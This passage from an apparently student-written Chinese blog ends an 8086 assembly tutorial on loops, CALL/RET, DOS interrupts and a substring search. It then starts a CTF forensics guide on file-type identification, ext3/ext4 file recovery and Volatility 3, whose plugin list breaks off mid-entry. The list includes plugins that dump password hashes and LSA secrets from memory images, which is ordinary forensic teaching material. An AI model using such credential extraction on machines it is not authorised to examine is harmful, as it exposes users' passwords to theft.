;CX≠0且ZF＝0，循环到标号label\n\n示例：\nmov cx,count    ;设置循环次数        mov si,offset string        xor bx,bx   ;bx清0，用于记录空格数        mov al,20hagain:  cmp al,es:[si]        jnz next    ;ZF=0，非空格，转移        inc bx      ;ZF=1，是空格，个数加1next:   inc si        loop again  ;字符个数减1，不为0继续循环\n\n\n\n\n\n子程序跳转指令 CALL\n子程序：子程序是完成特定功能的一段程序 当主程序（调用程序）需要执行这个功能时，采用CALL调用指令转移到该子程序的起始处执行，当运行完子程序功能后，采用RET返回指令回到主程序继续执行\n;使用格式CALL label      CALL reg/mem        ;SP&lt;-SP-2，SS:[SP]&lt;-IP,jmp labelreg/mem CALL far ptr labelCALL far ptr mem    ;SP&lt;-SP-2，SS:[SP]&lt;-IP                    ;SP&lt;-SP-2，SS:[SP]&lt;-CS\n\nCALL指令其实是做了两件事，执行到CALL时先将CALL指令的下一条指令的IP入栈，再JMP到指定的函数的地址处\n子程序返回指令 RET\n;使用格式RET（或者RETN）       ;无参数段内返回RET（或者RETN） i16   ;有参数段内返回RETF                ;无参数段间返回RETF i16            ;有参数段间返回\n\n各个指令的区别就在于弹栈时的数据\n\n\n\n语法\n功能\n堆栈操作\n\n\n\nRET\n近返回\nIP = POP()\n\n\nRETF\n远返回\nIP = POP(), CS = POP()\n\n\nRET n\n带立即数返回\n弹出返回地址后 SP = SP + n\n\n\n我们主要还是CALL和RET配合执行完跳转后还可以回到主程序\n注意call far ptr 需要与 retf 配合使用\n5.DOS系统功能调用这个我前面的知识还没怎么学会就来学这个东西了，没办法要不是为了考试，大二谁TMD来学汇编，麻烦的要死了\nDOS 功能调用是指汇编程序通过INT 21H软中断来调用DOS内部子程序完成特定的一系列操作的一种方法。\n也就是我们在通过INT 21H触发中断的时候就会自动调用DOS程序\n在学习和使用汇编语言过程中，用户不可能，也没有必要从最底层的第一个操作开始。例如打印字符串，若所有工作都由用户程序去做，是不现实的。而调用系统已有的程序就是一种有效的方法。而DOS功能调用就提供了这种方法。\n然后我也主要就是为了应付考试，来学习字符和字符串的输入和输出。\nDOS 系统功能调用的一般方法如下：\n\n（1）在寄存器 AH 中设置系统功能调用号，说明选择的功能\n（2）在指定寄存器中设置入口参数\n（3）用中断调用指令 INT 21H 执行功能调用\n（4）根据出口参数分析功能调用的执行情况\n\n\n\n\n功能号\n功能\n入口参数\n出口参数\n\n\n\nAH&#x3D;01H\n输入一个字符\n无\nAL&#x3D;输入字符的ASCII码\n\n\nAH&#x3D;02H\n输出一个字符\nDL&#x3D;输出字符的ASCII码\n无\n\n\nAH&#x3D;09H\n输出一个字符串\nDS:DX&#x3D;字符串首地址\n无\n\n\nAH&#x3D;0AH\n输入一个字符串\nDS:DX&#x3D;缓冲区首地址\n无\n\n\nAH&#x3D;4CH\n程序终止结束\nAL&#x3D;返回代码\n无\n\n\n例如：显示一个字符’A’\nMOV DL,41H  ;字符&#x27;A&#x27;的ASCII码41HMOV AH,02HINT 21H\n\n\n\n字符串输入\n\n执行该功能调用时，用户按键，最后用回车确认自付费串输入结束。\n0AH 号 DOS 功能要设置保存输入字符串的缓冲区，其缓冲区格式如下：\n第一个字节是最多接收的字符个数（包括回车字符，可以是1~255）。\n第二个字节存放实际输入的字符个数（不包括回车）。\n第三个字节开始将存放输入的字符串。实际输入的字符数多于定义数时，多出的字符丢掉，且响铃。\n\n字符串输出\n\n字符串应以 $(24H) 结束，输出时遇到$会自动结束输出。\n可以输出回车 (0DH) 和 换行 （0AH）字符产生回车和换行的作用。\n\n然后我们来看一个简单的字符串输入输出的代码\n; 定义数据段data segment    ; 输入缓冲区结构    BUFFER DB 20        ; 最大接收20个字符           DB ?         ; 实际输入的字符数(由DOS填充)           DB 20 DUP(&#x27;$&#x27;) ; 字符串存储空间，用$预填充        PROMPT  DB &#x27;Enter a string: $&#x27;    RESULT  DB 0DH, 0AH, &#x27;You entered: $&#x27;  ; 0DH,0AH是回车换行data ends; 定义栈段stack segment stack    db 100 dup(?)stack ends; 定义代码段code segment    assume cs:code, ds:data, ss:stackstart:    ; 初始化数据段    mov ax, data    mov ds, ax        ; 初始化栈段    mov ax, stack    mov ss, ax    mov sp, 100        ; === 1. 显示提示信息 ===    mov ah, 09h    mov dx, offset PROMPT ;将字符串的首地址赋值给dx    int 21h        ; === 2. 获取字符串输入 ===    mov ah, 0Ah           ; DOS功能：缓冲输入    mov dx, offset BUFFER ; DX指向缓冲区    int 21h        ; === 3. 显示结果信息 ===    mov ah, 09h    mov dx, offset RESULT ;输出结束语    int 21h        ; === 4. 显示用户输入的字符串 ===    mov ah, 09h    mov dx, offset BUFFER + 2  ; 跳过前2字节，指向实际字符串    int 21h        ; === 5. 程序退出 ===    mov ax, 4c00h    int 21hcode endsend start\n\nC语言里面一个刚入门的Hello World 在汇编中现在才学会，😔\n6.程序设计虽然看得懂代码了，但是根本不会写，也不知道如何使用汇编实现功能。还是得熟悉一下各种简单算法的写法，话说我用汇编写出来的那种垃圾程序能被称为算法吗，而且汇编期末考试还是笔试，还不能先把框架写好。\n1.MASM框架书上教的就是这个框架，挺好懂的但是就是有点麻烦\ndata segement      prompt db &#x27;Pleas input your sring: $&#x27;     result db &#x27;Your result is: $&#x27;date endsstack segment stack      db 100 dup(?)stack endscode segement     assume cs:code, ds:data, ss:stackstart:     ;初始化数据段     mov ax,data     mov ds,ax       mov ax,stack     mov ss,ax          ;输出提示信息     mov AH,09H     mov DX,offset prompt     int 21H               code ends\n\n\n\n字符串查找代码\n; 简化版字符串查找程序; 功能：在主字符串中查找子字符串，显示找到的位置或未找到信息data segment    main_str db &#x27;HELLOWORLD$&#x27;    ; 主字符串，以$结束    sub_str  db &#x27;WORLD$&#x27;         ; 要查找的子字符串，以$结束    found    db 0dh,0ah,&#x27;Found at: $&#x27;     ; 找到时的提示信息    notfound db 0dh,0ah,&#x27;Not found!$&#x27;     ; 未找到时的提示信息data endscode segment    assume cs:code, ds:data      ; 告诉汇编器段寄存器对应的段start:    ; 初始化数据段寄存器    mov ax, data    mov ds, ax        mov si, 0           ; SI寄存器作为主字符串的当前位置指针                        ; 从主字符串的第0个字符开始搜索    search_loop:    ; ===== 外层循环：遍历主字符串每个可能的起始位置 =====        ; 检查是否超出搜索范围    ; 主字符串&quot;HELLOWORLD&quot;长度为10，子字符串&quot;WORLD&quot;长度为5    ; 最大有效起始位置 = 10 - 5 = 5    ; 如果SI &gt; 5，说明已经搜索完所有可能的位置    cmp si, 5           ; 比较SI和5    ja not_found        ; 如果SI &gt; 5，跳转到未找到处理        mov di, 0           ; DI寄存器作为子字符串的当前位置指针                        ; 每次从子字符串的第0个字符开始比较    compare_loop:    ; ===== 内层循环：比较主字符串和子字符串的每个字符 =====        ; 读取主字符串的当前字符    ; main_str[si+di] 表示：主字符串起始位置si + 子字符串当前位置di    mov al, main_str[si+di]  ; AL = 主字符串中当前比较的字符        ; 读取子字符串的当前字符      mov bl, sub_str[di]      ; BL = 子字符串中当前比较的字符        ; 比较两个字符是否相等    cmp al, bl              ; 比较AL和BL    jne next_pos            ; 如果不相等，跳出内层循环，尝试下一个位置        ; 如果字符相等，继续比较下一个字符    inc di                  ; DI加1，指向子字符串的下一个字符        ; 检查是否已经比较到子字符串的末尾    ; 检查子字符串当前字符是否为&#x27;$&#x27;（字符串结束符）    cmp sub_str[di], &#x27;$&#x27;    ; 比较当前字符与&#x27;$&#x27;    jne compare_loop        ; 如果不是&#x27;$&#x27;，继续内层循环比较下一个字符        ; ===== 找到子字符串！ =====    ; 执行到这里说明：所有字符都匹配，且已经到达子字符串末尾        ; 显示&quot;Found at: &quot;提示信息    mov ah, 9              ; DOS功能号09h：显示字符串    lea dx, found          ; DX指向找到提示信息的地址    int 21h                ; 调用DOS中断显示字符串        ; 显示找到的位置（将数字转换为ASCII字符显示）    mov dl, &#x27;0&#x27;            ; DL = 字符&#x27;0&#x27;的ASCII码    add dl, si             ; DL = &#x27;0&#x27; + SI，将数字转换为对应的ASCII字符                           ; 例如：SI=5 → DL=&#x27;0&#x27;+5=&#x27;5&#x27;    mov ah, 2              ; DOS功能号02h：显示字符    int 21h                ; 调用DOS中断显示字符        jmp exit               ; 跳转到程序结束    next_pos:    ; ===== 当前起始位置不匹配，尝试下一个位置 =====    inc si                 ; SI加1，主字符串的起始位置向后移动一位    jmp search_loop        ; 跳回外层循环，继续搜索    not_found:    ; ===== 未找到子字符串 =====    mov ah, 9              ; DOS功能号09h：显示字符串    lea dx, notfound       ; DX指向未找到提示信息的地址    int 21h                ; 调用DOS中断显示字符串    exit:    ; ===== 程序结束 =====    mov ah, 4ch            ; DOS功能号4Ch：程序退出    int 21h                ; 调用DOS中断结束程序    code endsend start                  ; 程序结束，从start标号开始执行\n\n"},{"title":"电子取证","url":"/2025/12/16/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/","content":"电子取证不知道是杂项学到后面了还是怎么回事，好像取证的题目越来越多了，然后取证感觉和杂项其他题目都有点不一样了，感觉取证应该自己再立一个方向\n电子取证主要包括磁盘取证和内存取证\n工具介绍取证这里，工具是最重要的，如果有工具大部分内存取证的题目都可以用lovelymen梭哈，但是学会工具怎么用特别重要，后面会把用到的工具都收集起来\n磁盘取证我们在得到附件的时候，如果是一个没后缀且没见过的文件类型，或者没见过的后缀，那大概率就是取证了\n我们如果需要判断是否为磁盘取证，我们首先需要识别文件类型\n1.确认文件类型我们区分内存取证和磁盘取证主要的方式就是通过文件类型，当我们拿到文件没有后缀的时候就需要使用工具进行判断\nTrIDNet\n这个工具感觉就是TrID的一个图形化界面程序，exe文件下载地址\n\n\n注意这两个都是要下载的，一个是exe文件另外一个是xml文件集\n我们需要将xml文件集解压出来的defs文件放到exe文件的目录下，这样就会自动加载了\n这个文件类型有两千多种，但是有时候做题还是识别不出来，真的是难为出题人了\n然后听说是可以自己往里面加类型的，但是现在我还不会\nfile命令\n我们可以使用Linux内置的file命令判断文件类型\nfile命令是通过魔术字节（magic number）匹配和其他 heuristics（启发式方法）来识别文件类型。\n也就是说判断文件类型的数目取决于magic数据库\n我们可以通过file -version判断\n\n\n\n系统 &#x2F; 版本\nmagic 条目\n可能识别类型数量\n\n\n\nUbuntu 22.04 &#x2F; file 5.41\n~5600\n2000–3000+\n\n\nCentOS 7 &#x2F; file 5.11\n~4400\n1500–2500\n\n\n我又拿file命令试了一下，发现刚才那个文件还是不行\n语法\nfile [-bcLvz][-f &lt;名称文件&gt;][-m &lt;魔法数字文件&gt;...][文件或目录...]\n\n参数：\n\n-b 　列出辨识结果时，不显示文件名称。\n-c 　详细显示指令执行过程，便于排错或分析程序执行的情形。\n-f&lt;名称文件&gt; 　指定名称文件，其内容有一个或多个文件名称时，让file依序辨识这些文件，格式为每列一个文件名称。\n-L 　直接显示符号连接所指向的文件的类别。\n-m&lt;魔法数字文件&gt; 　指定魔法数字文件。\n-v 　显示版本信息。\n-z 　尝试去解读压缩文件的内容。\n[文件或目录…] 要确定类型的文件列表，多个文件之间使用空格分开，可以使用shell通配符匹配多个文件。\n\n实例\n[root@localhost ~]# file install.loginstall.log: UTF-8 Unicode text[root@localhost ~]# file -b install.log      &lt;== 不显示文件名称UTF-8 Unicode text[root@localhost ~]# file -i install.log      &lt;== 显示MIME类别。install.log: text/plain; charset=utf-8[root@localhost ~]# file -b -i install.logtext/plain; charset=utf-8\n\n显示符号链接的文件类型\n[root@localhost ~]# ls -l /var/maillrwxrwxrwx 1 root root 10 08-13 00:11 /var/mail -&gt; spool/mail[root@localhost ~]# file /var/mail/var/mail: symbolic link to `spool/mail&#x27;[root@localhost ~]# file -L /var/mail/var/mail: directory[root@localhost ~]# file /var/spool/mail/var/spool/mail: directory[root@localhost ~]# file -L /var/spool/mail/var/spool/mail: directory\n\n\n\n我感觉主要判断类型有这两个方法就够了，这两个不行其他方法估计也不行\n2.磁盘分区磁盘取证，那文件肯定是一个磁盘，下次遇见不能判断的文件类型，直接猜是磁盘直接尝试\n文件系统\nwindows主流为FAT和NEFS（FAT12 -&gt; FAT16 -&gt; FAT32 -&gt; NTFS），linux常见文件系统为Ext2、Ext3、Ext4（EXT2 -&gt; EXT3 -&gt; EXT4)这些可以在进行文件类型判断的时候顺便知道\n\n\nFAT：文件分配表，记录文件所在位置的表格。FAT文件系统用“簇”作为数据单元，用户文件和目录都存储在簇中。\nNTFS：新技术文件系统，是WindowsNT环境的文件系统，一个日志文件系统，保存磁盘写入信息外还会对所有改变保留一份日志。\n比较：NTFS能够很快恢复正常，且不易丢失数据，替代了老式的FAT文件系统。\nExt：Linux扩展文件系统。Ext2被称作索引是文件系统，Ext3&#x2F;Ext4被称作日志文件系统\nCTF中往往会拿到一个无扩展名或者是和文件系统相关扩展名的文件，可以先通过Linux的file命令或者windows的TrIDNet工具识别文件类型，若是磁盘镜像，基本就是磁盘取证了\n文件恢复\n早在之前写Misc的时候就遇到过文件恢复，可惜当时甚至都不知道这考的是取证。\n1.Windows文件恢复\n在恢复文件之前我们需要先将磁盘镜像文件进行挂载\nWindwos系统中我使用的是DisGenius\n我没有题目就只能抄一下大佬的博客了\n先进行挂载\n\n\n然后直接恢复文件，我们可以去查看镜像磁盘然后对着目标文件直接恢复即可\n\n\n恢复结果\n\n\n\n\n2.Linux文件恢复\nLinux系统就没有像Windows系统那么号的图形化界面，我们只能使用命令行进行操作\nLinux挂载\nsudo mount 文件名 自定义目录\t\t#挂载镜像sudo umount  文件名 \t\t\t#取消挂载\n\n然后挂载的镜像就会加载到指定的目录\n\n\n我们在该目录下发现了加载的文件\n\n\n然后取消挂载其中文件也会删除，mount命令有点多，我感觉只会这两个我就够了\nLinux文件恢复\n主要的恢复工具有ext3grep和extundelete，其中ext3grep主要负责ext3文件系统的恢复，然后extundelete适配ext3和ext4，extundelete更加现代和方便，于是每次都优先使用extundelete\nextundelete\n专门针对 ext3 &#x2F; ext4\n基于 Journal（日志）恢复\n能恢复：\n\n已删除文件\n已删除目录\n整个分区所有可恢复内容\n\n由于是基于日志的恢复，如果没有Journal就需要使用ext3grep\n适用场景：\n\nflag 文件被 rm 删除\n文件名还在，但内容没了\n分区还能正常挂载\njournal 仍存在\n\n实例\n# 卸载镜像  我们在恢复的时候可以使用分区，也就是我们挂载镜像的目录，这次储存着文件的数据，也可以直接使用镜像文件sudo umount /dev/sdb1# 查看可恢复的inode 2代表的是根目录，后面不同的数字代表其中的文件，每次使用2就会显示目录下的全部文件sudo extundelete /dev/sdb1 --inode 2# 恢复单个文件 我们可以使用inode标号也可以使用文件路径，这个文件路径是被删除文件之前的路径可以在查看文件时看到，路径不能写错也不需要前面带根目录sudo extundelete /dev/sdb1 --restore-file home/kali/flag.txt# 恢复整个目录 恢复的文件会出现在 RECOVERED_FILES/sudo extundelete /dev/sdb1 --restore-all\n\n看了实例，感觉还是直接使用镜像文件进行恢复，恢复的时候直接传inode标号比较方便\next3grep\n\n更底层的 inode &#x2F; block 扫描工具\n主要针对 ext3\n可以不依赖 journal（一定程度）\n\n适用场景：\n\nextundelete 无法恢复\njournal 被破坏\n文件名丢失也无所谓（只要内容）\n\n实例\n# 卸载镜像sudo umount /dev/sdb1# 扫描超级块sudo ext3grep /dev/sdb1 --superblock# 恢复所有可恢复项sudo ext3grep /dev/sdb1 --restore-all# 恢复指定inodesudo ext3grep /dev/sdb1 --restore-inode 12345# 恢复文件也是一般存放在 RESTORED_FILES/\n\n✅ 优点：\n\n比 extundelete 更“野”\n在 journal 失效时仍可能成功\n\n❌ 缺点：\n\n恢复文件名不友好\next4 支持不完整\n输出杂乱，需要人工筛选\n\n两个的对比\n\n\n\n对比项\nextundelete\next3grep\n\n\n\n支持 FS\next3 &#x2F; ext4\next3（ext4 部分）\n\n\n是否依赖 journal\n是\n不完全\n\n\n文件名恢复\n✅ 好\n❌ 差\n\n\n目录结构\n✅\n❌\n\n\nCTF 推荐度\n⭐⭐⭐⭐⭐\n⭐⭐⭐\n\n\n总之就是extundelete比ext3grep好用，但是ext3grep不需要journal，可以把所有数据都恢复，所以会是乱的需要我们自己筛选，做题的时候，就先尝试extundelete失败了再使用ext3grep，两个都失败就算了\n内存取证看完了磁盘取证，原来电脑中已经删除了的数据是这么恢复的，现在就到了我们最常考的内存取证了\n内存取证通常是指对计算机等智能设备运行时内存中存储的临时数据进行获取与分析，提取有价值的数据\n在CTF比赛中，内存取证往往是提供一个完整的内存镜像，所以说看到提供的附件很大，就可以直接判断是内存取证了\n1.volatility虽然现在我们内存取证有我们的lovelymen有时候直接一把梭，但是我觉得还是要想流量分析一样，不能只是依靠工具一把梭哈，而是要了解一下原理\n下载地址GitHub - volatilityfoundation&#x2F;volatility3: Volatility 3.0 开发 — GitHub - volatilityfoundation&#x2F;volatility3: Volatility 3.0 development这个应该是Wiondows和Linux系统都可以使用的，但是鉴于编码问题和一些命令还是Linux方便一点还是推荐在Linux系统中使用\n我使用的是volatitlity3，不用2纯粹感觉有最新版为什么要用老的，而且lovelymen里面也内置了2\n当遇到扩展名为raw、img、dmp、vmem等时，就可以直接开始使用进行内存取证了\n安装\n感觉github这个比以前的都方便安装一点了，下载好压缩包解压后直接下载依赖项就可以了\npip install --user -e &quot;.[full]&quot;\n\n\n\n\n\n命令格式\nvolatility -f [image] --profile=[profile] [plugin]\n\n这里需要注意 ：Volatility3和Volatility2用法差不多，但不需要指定profile ，只是插件调用方式改变，特定的操作系统有特定的插件\n我们直接输入python vol.py -h即可查看到可用参数和插件\n常用参数\n可选参数:  -h, --help            显示此帮助信息并退出，查看特定插件的选项使用 &#x27;vol.py &lt;插件名&gt; --help&#x27;  -c CONFIG, --config CONFIG                        从JSON文件加载配置  --parallelism [&#123;processes,threads,off&#125;]                        启用并行处理（如果未提供参数，则默认为关闭）  -e EXTEND, --extend EXTEND                        使用新的（或更改的）设置扩展配置  -p PLUGIN_DIRS, --plugin-dirs PLUGIN_DIRS                        用于查找插件的路径列表，以分号分隔  -s SYMBOL_DIRS, --symbol-dirs SYMBOL_DIRS                        用于查找符号文件的路径列表，以分号分隔  -v, --verbosity       增加输出详细程度  -l LOG, --log LOG     将输出记录到文件和控制台  -o OUTPUT_DIR, --output-dir OUTPUT_DIR                        输出生成的文件的目录  -q, --quiet           移除进度反馈  -r RENDERER, --renderer RENDERER                        确定如何渲染输出（quick, none, csv, pretty, json, jsonl）  -f FILE, --file FILE  如果未定义single-location，则作为--single-location=file://的简写  --write-config        将配置JSON文件写出到config.json  --save-config SAVE_CONFIG                        将配置JSON文件保存到文件  --clear-cache         清除所有短期缓存项目  --cache-path CACHE_PATH                        更改用于存储缓存的默认路径（C:\\Users\\misaki\\AppData\\Roaming\\volatility3）  --offline             不搜索在线JSON文件  -u URL, --remote-isf-url URL                        在线搜索ISF JSON文件  --filters FILTERS     应用于输出的过滤器列表（格式为[+-]列名,模式[!]）  --hide-columns [HIDE_COLUMNS ...]                        不区分大小写的空格分隔前缀列表，用于确定输出中隐藏哪些列（如果提供）  --single-location SINGLE_LOCATION                        指定要在其上堆叠的基础位置  --stackers [STACKERS ...]                        堆叠器列表  --single-swap-locations [SINGLE_SWAP_LOCATIONS ...]                        指定与single-location一起使用的交换层URI列表\n\n\n\n常见插件\nVolatility 3 插件中文说明核心插件 (Core Plugins)- banners.Banners - 尝试识别镜像中的潜在Linux系统信息横幅- configwriter.ConfigWriter - 运行自动化检测并输出配置文件到输出目录- frameworkinfo.FrameworkInfo - 列出Volatility的各种模块化组件- isfinfo.IsfInfo - 确定当前可用ISF文件的信息或特定ISF文件的信息- layerwriter.LayerWriter - 运行自动化检测并写出堆栈器生成的主层Linux 插件基本信息收集- linux.bash.Bash - 从内存中恢复bash命令历史- linux.boottime.Boottime - 显示系统启动时间- linux.capabilities.Capabilities - 列出进程权限- linux.elfs.Elfs - 列出所有进程的内存映射ELF文件- linux.envars.Envars - 列出进程及其环境变量- linux.kallsyms.Kallsyms - 内核符号枚举插件- linux.kmsg.Kmsg - 内核日志缓冲区读取器- linux.lsmod.Lsmod - 列出已加载的内核模块- linux.mountinfo.MountInfo - 列出进程挂载命名空间的挂载点- linux.vmcoreinfo.VMCoreInfo - 枚举VMCoreInfo表进程管理- linux.pidhashtable.PIDHashTable - 通过PID哈希表枚举进程- linux.proc.Maps - 列出所有进程的所有内存映射- linux.psaux.PsAux - 列出进程及其命令行参数- linux.pscallstack.PsCallStack - 枚举每个任务的调用栈- linux.pslist.PsList - 列出特定Linux内存镜像中的进程- linux.psscan.PsScan - 扫描特定Linux镜像中的进程- linux.pstree.PsTree - 基于父进程ID以树形结构列出进程的插件- linux.ptrace.Ptrace - 枚举ptrace的追踪者和被追踪任务网络相关- linux.ip.Addr - 列出所有设备的网络接口信息- linux.ip.Link - 列出网络接口信息，类似于`ip link show`- linux.netfilter.Netfilter - 列出Netfilter钩子- linux.sockstat.Sockstat - 列出所有进程的所有网络连接内核与系统检查- linux.check_afinfo.Check_afinfo - 验证网络协议操作函数指针- linux.check_creds.Check_creds - 检查是否有进程共享凭证结构- linux.check_idt.Check_idt - 检查IDT是否被修改- linux.check_modules.Check_modules - 比较模块列表与sysfs信息（如果可用）- linux.check_syscall.Check_syscall - 检查系统调用表中的钩子- linux.hidden_modules.Hidden_modules - 从内存中挖掘查找隐藏的内核模块- linux.iomem.IOMem - 生成类似于运行系统中`/proc/iomem`的输出内存与文件分析- linux.pagecache.Files - 从内存中列出文件- linux.pagecache.InodePages - 列出并恢复缓存的inode页面- linux.pagecache.RecoverFs - 将缓存的文件系统（目录、文件、符号链接）恢复到压缩的tar包中- linux.lsof.Lsof - 列出每个进程打开的文件- linux.library_list.LibraryList - 枚举加载到进程中的库内核线程与事件- linux.ebpf.EBPF - 枚举eBPF程序- linux.graphics.fbdev.Fbdev - 从fbdev图形子系统中提取帧缓冲区- linux.keyboard_notifiers.Keyboard_notifiers - 解析键盘通知器调用链- linux.kthreads.Kthreads - 枚举内核线程函数- linux.module_extract.ModuleExtract - 从内核中的特定地址重新创建ELF文件- linux.modxview.Modxview - 集中lsmod、check_modules和hidden_modules结果，高效发现模块存在和污染调试与追踪- linux.tracing.ftrace.CheckFtrace - 检测ftrace钩子- linux.tracing.perf_events.PerfEvents - 列出每个进程的性能事件- linux.tracing.tracepoints.CheckTracepoints - 检测跟踪点钩子- linux.tty_check.tty_check - 检查tty设备是否被挂钩内存扫描- linux.malfind.Malfind - 列出可能包含注入代码的进程内存范围- linux.vmaregexscan.VmaRegExScan - 使用正则表达式扫描任务的所有虚拟内存区域- linux.vmayarascan.VmaYaraScan - 使用Yara规则扫描任务的所有虚拟内存区域macOS 插件基本信息收集- mac.bash.Bash - 从内存中恢复bash命令历史- mac.dmesg.Dmesg - 打印内核日志缓冲区- mac.ifconfig.Ifconfig - 列出所有设备的网络接口信息- mac.lsmod.Lsmod - 列出已加载的内核模块- mac.mount.Mount - 包含一组插件的模块，产生通常在Mac的mount命令中找到的数据进程管理- mac.list_files.List_Files - 列出所有进程的所有打开文件描述符- mac.lsof.Lsof - 列出所有进程的所有打开文件描述符- mac.psaux.Psaux - 恢复程序命令行参数- mac.pslist.PsList - 列出特定mac内存镜像中的进程- mac.pstree.PsTree - 基于父进程ID以树形结构列出进程的插件网络相关- mac.netstat.Netstat - 列出所有进程的所有网络连接内核与安全检查- mac.check_syscall.Check_syscall - 检查系统调用表中的钩子- mac.check_sysctl.Check_sysctl - 检查sysctl处理程序中的钩子- mac.check_trap_table.Check_trap_table - 检查Mach陷阱表中的钩子- mac.kauth_listeners.Kauth_listeners - 列出kauth监听器及其状态- mac.kauth_scopes.Kauth_scopes - 列出kauth作用域及其状态- mac.socket_filters.Socket_filters - 枚举内核套接字过滤器- mac.trustedbsd.Trustedbsd - 检查恶意trustedbsd模块- mac.vfsevents.VFSevents - 列出正在过滤文件系统事件的进程内存与事件分析- mac.kevents.Kevents - 列出进程注册的事件处理程序- mac.malfind.Malfind - 列出可能包含注入代码的进程内存范围- mac.proc_maps.Maps - 列出可能包含注入代码的进程内存范围- mac.timers.Timers - 检查恶意内核定时器Windows 插件基本信息收集- windows.info.Info - 显示正在分析的内存样本的操作系统和内核详细信息- windows.statistics.Statistics - 列出关于内存空间的统计信息- windows.crashinfo.Crashinfo - 列出Windows崩溃转储的信息进程管理- windows.pslist.PsList - 列出特定Windows内存镜像中的进程- windows.psscan.PsScan - 扫描特定Windows内存镜像中的进程- windows.pstree.PsTree - 基于父进程ID以树形结构列出进程的插件- windows.psxview.PsXView - 列出通过《内存取证艺术》中描述的四种方法找到的所有进程，有助于识别试图隐藏自身的进程- windows.threads.Threads - 列出进程线程进程详细信息- windows.cmdline.CmdLine - 列出进程命令行参数- windows.envars.Envars - 显示进程环境变量- windows.getsids.GetSIDs - 打印拥有每个进程的SID- windows.getservicesids.GetServiceSIDs - 列出进程令牌SID- windows.privileges.Privs - 列出进程令牌权限- windows.sessions.Sessions - 列出从环境变量中提取会话信息的进程DLL与模块管理- windows.dlllist.DllList - 列出特定Windows内存镜像中加载的DLL- windows.ldrmodules.LdrModules - 列出特定Windows内存镜像中加载的模块- windows.modules.Modules - 列出已加载的内核模块- windows.unloadedmodules.UnloadedModules - 列出已卸载的内核模块内存分析- windows.memmap.Memmap - 打印内存映射- windows.vadinfo.VadInfo - 列出进程内存范围- windows.vadwalk.VadWalk - 遍历VAD树- windows.virtmap.VirtMap - 列出虚拟映射部分文件系统分析- windows.filescan.FileScan - 扫描特定Windows内存镜像中的文件对象- windows.dumpfiles.DumpFiles - 从Windows内存样本中导出缓存的文件内容- windows.mftscan.MFTScan - 扫描特定Windows内存镜像中的MFT FILE对象- windows.mftscan.ADS - 扫描备用数据流- windows.mftscan.ResidentData - 扫描包含常驻数据的MFT记录网络分析- windows.netscan.NetScan - 扫描特定Windows内存镜像中的网络对象- windows.netstat.NetStat - 遍历特定Windows内存镜像中的网络跟踪结构注册表分析- windows.registry.hivelist.HiveList - 列出特定内存镜像中的注册表配置单元- windows.registry.hivescan.HiveScan - 扫描特定Windows内存镜像中的注册表配置单元- windows.registry.printkey.PrintKey - 列出配置单元或特定键值下的注册表键- windows.registry.userassist.UserAssist - 打印userassist注册表键和信息- windows.registry.certificates.Certificates - 列出注册表证书存储中的证书驱动与设备- windows.devicetree.DeviceTree - 基于特定Windows内存镜像中的驱动程序和附加设备列出树形结构- windows.drivermodule.DriverModule - 确定是否有任何加载的驱动程序被rootkit隐藏- windows.driverscan.DriverScan - 扫描特定Windows内存镜像中的驱动程序- windows.driverirp.DriverIrp - 列出特定Windows内存镜像中驱动程序的IRP- windows.modscan.ModScan - 扫描特定Windows内存镜像中的模块服务分析- windows.svcscan.SvcScan - 扫描Windows服务- windows.svclist.SvcList - 列出services.exe双链表中包含的服务- windows.svcdiff.SvcDiff - 比较通过列表遍历和扫描找到的服务以发现rootkit安全检查- windows.malfind.Malfind - 列出可能包含注入代码的进程内存范围- windows.callbacks.Callbacks - 列出内核回调和通知例程- windows.ssdt.SSDT - 列出系统调用表- windows.hollowprocesses.HollowProcesses - 列出被掏空的进程- windows.processghosting.ProcessGhosting - 列出DeletePending位被设置或FILE_OBJECT设置为0或Vads被标记为DeleteOnClose的进程- windows.skeleton_key_check.Skeleton_Key_Check - 查找Skeleton Key恶意软件的迹象密码与哈希提取- windows.hashdump.Hashdump - 从内存中导出用户哈希（已弃用）- windows.lsadump.Lsadump - 从内存中导出LSA机密信息（已弃用）- windows.cachedump.Cachedump - 从内存中导出LSA机密信息（已弃用）- windows.registry.hashdump.Hashdump - 从内存中导出用户哈希- windows.registry.lsadump.Lsadump - 从内存中导出LSA机密信息- windows.registry.cachedump.Cachedump - 从内存中导出LSA机密信息应用缓存与执行历史- windows.amcache.Amcache - 从AmCache中提取已执行应用程序的信息（已弃用）- windows.registry.amcache.Amcache - 从AmCache中提取已执行应用程序的信息- windows.shimcachemem.ShimcacheMem - 从ahcache.sys AVL树中读取Shimcache条目用户界面相关- windows.windowstations.WindowStations - 扫描顶层Windows工作站- windows.windows.Windows - 枚举桌面实例的窗口- windows.desktops.Desktops - 枚举每个窗口站的桌面实例- windows.deskscan.DeskScan - 扫描每个窗口站的桌面实例- windows.consoles.Consoles - 查找Windows控制台缓冲区计划任务- windows.scheduled_tasks.ScheduledTasks - 从Windows注册表中解码计划任务信息，包括触发器、操作、运行时间和创建时间的信息（已弃用）- windows.registry.scheduled_tasks.ScheduledTasks - 从Windows注册表中解码计划任务信息，包括触发器、操作、运行时间和创建时间的信息句柄与对象- windows.handles.Handles - 列出进程打开的句柄- windows.mutantscan.MutantScan - 扫描特定Windows内存镜像中的互斥体- windows.symlinkscan.SymlinkScan - 扫描特定Windows内存镜像中的链接- windows.thrdscan.ThrdScan - 扫描Windows线程系统调用与API- windows.direct_system_calls.DirectSystemCalls - 检测用于绕过EDR的直接系统调用技术- windows.indirect_system_calls.IndirectSystemCalls - 间接系统调用检测- windows.unhooked_system_calls.unhooked_system_calls - 查找Skeleton Key恶意软件的迹象（注意：此描述可能有误，应为检测未挂钩的系统调用）其他安全检测- windows.etwpatch.EtwPatch - 识别恶意软件用于逃避检测的ETW（Windows事件追踪）修补技术- windows.registry.getcellroutine.GetCellRoutine - 报告具有挂钩GetCellRoutine处理程序的注册表配置单元调试相关- windows.debugregisters.DebugRegisters - 列出调试寄存器信息- windows.suspended_threads.SuspendedThreads - 枚举挂起的线程PE文件分析- windows.iat.IAT - 提取导入地址表以列出程序使用的外部库中的API（函数）- windows.pedump.PEDump - 允许从特定地址空间的特定地址提取PE文件- windows.pe_symbols.PESymbols - 打印进程和内核内存中PE文件的符号- windows.verinfo.VerInfo - 列出PE文件中的版本信息内核结构- windows.kpcrs.KPCRs - 为每个处理器打印KPCR结构- windows.timers.Timers - 打印内核定时器和相关的模块DPC- windows.joblinks.JobLinks - 打印进程作业链接信息- windows.bigpools.BigPools 